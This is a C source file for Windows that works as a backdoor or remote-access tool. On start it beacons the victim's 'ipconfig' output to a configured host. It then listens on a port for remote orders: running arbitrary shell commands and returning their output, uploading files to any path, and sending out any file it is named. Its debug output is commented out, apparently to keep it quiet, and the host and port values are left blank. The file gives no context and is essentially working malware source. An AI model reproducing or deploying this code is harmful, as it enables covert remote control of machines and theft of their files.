#include <stdio.h>
#include <winsock2.h>
#define PORT1 
#define PORT2 
#define ERROR 0
#define IP 
#define BUFFER_SIZE 1024
#define FILE_SIZE 1024
#include <windows.h>

void Send()
{
    SOCKET sock2;
    SOCKADDR_IN ClientAddr;
    WSADATA WSAData;

    if(WSAStartup(MAKEWORD(2,2),&WSAData)==SOCKET_ERROR)
    {
        exit(1);
    }
    if((sock2=socket(AF_INET,SOCK_STREAM,0))==SOCKET_ERROR)
    {
      closesocket(sock2);
      WSACleanup();
      exit(1);
    }
    ClientAddr.sin_family=AF_INET;
    ClientAddr.sin_port=htons(PORT1);
    ClientAddr.sin_addr.s_addr=inet_addr(IP);
    if(connect(sock2,(LPSOCKADDR)&ClientAddr,sizeof(ClientAddr))==SOCKET_ERROR)
    {
      //printf("Connect fail!\n");
      closesocket(sock2);
      WSACleanup();
      exit(1);
    }

    FILE *pf=popen("ipconfig","r");
    char bf[BUFFER_SIZE];
    int readNow=0;
    while((readNow=fread(&bf[0],1,FILE_SIZE,pf))!=0)
    {
        int Ret;
        Ret=send(sock2,bf,readNow,0);
        if(Ret==SOCKET_ERROR)
        {
            break;
        }
        memset(bf,0,sizeof(bf));
    }
    pclose(pf);
    closesocket(sock2);
    WSACleanup();
}
SOCKET con()
{
    WSADATA WSAData;
    SOCKET sock;
    SOCKADDR_IN ServerAddr;
    if(WSAStartup(MAKEWORD(2,2),&WSAData)==SOCKET_ERROR)
    {
        //printf("Socket initialize fail!\n");
        //system("pause");
        exit(1);
    }

    if((sock=socket(AF_INET,SOCK_STREAM,0))==ERROR)
    {
        //printf("Socket create fail!\n");
        //system("pause");
        WSACleanup();
        exit(1);
    }
    ServerAddr.sin_family=AF_INET;
    ServerAddr.sin_port=htons(PORT2);
    ServerAddr.sin_addr.s_addr=INADDR_ANY;
    if(bind(sock,(LPSOCKADDR)&ServerAddr,sizeof(ServerAddr))==SOCKET_ERROR)
    {
        //printf("Bind fail!\n");
        closesocket(sock);
        WSACleanup();
        //system("pause");
        exit(1);
    }
    //printf("Server Socket Port:%d\n",ntohs(ServerAddr.sin_port));
    if(listen(sock,10)==SOCKET_ERROR)
    {
        //printf("Listen fail!\n");
        closesocket(sock);
        WSACleanup();
        exit(1);
    }
    return sock;
}

int main()
{
  Send();
  SOCKET sock=con();
  char buf[BUFFER_SIZE];
  char bf[BUFFER_SIZE];
  while(1)
  {
    memset(buf,0,sizeof(buf));
    SOCKET msgsock=accept(sock,(LPSOCKADDR)0,(int *)0);
    recv(msgsock,buf,BUFFER_SIZE,0);
    if(buf[0]=='e' && buf[1]=='x' && buf[2]=='i' && buf[3]=='t')
    {
      //printf("The End.\n");
      closesocket(sock);
      closesocket(msgsock);
      WSACleanup();
      exit(1);
    }
    else if(buf[0]=='s' && buf[1]=='e' && buf[2]=='n' && buf[3]=='d')
    {
        int i=0,j=0;
        char pathc[100];
        while(buf[i]!=' ')
        {
            i++;
        }
        i++;
        while(buf[i]!=' ')
        {
            i++;
        }
        i++;
        while(buf[i]!='\0')
        {
            pathc[j]=buf[i];
            i++;
            j++;
        }
        pathc[j]='\0';
        FILE *file=fopen(pathc,"wb");
        char filec[FILE_SIZE];
        while(1)
        {
            int RecvNow;
            RecvNow=recv(msgsock,&filec[0],FILE_SIZE,0);
            fwrite(filec,FILE_SIZE, sizeof(char), file);
            if(RecvNow<FILE_SIZE)
            {
                fclose(file);
                break;
            }
            memset(filec,0,FILE_SIZE);
        }

    }
    else if(buf[0]=='r' && buf[1]=='e' && buf[2]=='c' && buf[3]=='v')
    {
        char fileFromName[100];
        int i=0,m=0;
        while(buf[i]!=' ')
        {
            i++;
        }
        i++;
        while(buf[i]!=' ')
        {
            fileFromName[m]=buf[i];
            m++;
            i++;
        }
        fileFromName[m]='\0';
        FILE *file;
        if((file=fopen(fileFromName,"rb"))==NULL)
        {
            continue;
        }
        else
        {
            int readNow;
            char filec[FILE_SIZE];
            while((readNow=fread(&filec[0],1,FILE_SIZE,file))!=0)
            {
                send(msgsock,filec,readNow,0);
                memset(filec,0,FILE_SIZE);
            }

        }
        fclose(file);
    }
    else
    {

        FILE *pf=popen(buf,"r");
        int readNow=0;
        while((readNow=fread(&bf[0],1,FILE_SIZE,pf))!=0)
        {
            int Ret;
            Ret=send(msgsock,bf,readNow,0);
            if(Ret==SOCKET_ERROR)
            {
                break;
            }
            memset(bf,0,sizeof(bf));
        }
        pclose(pf);


    }
    closesocket(msgsock);
  }

  closesocket(sock);
  WSACleanup();
  return 0;
}
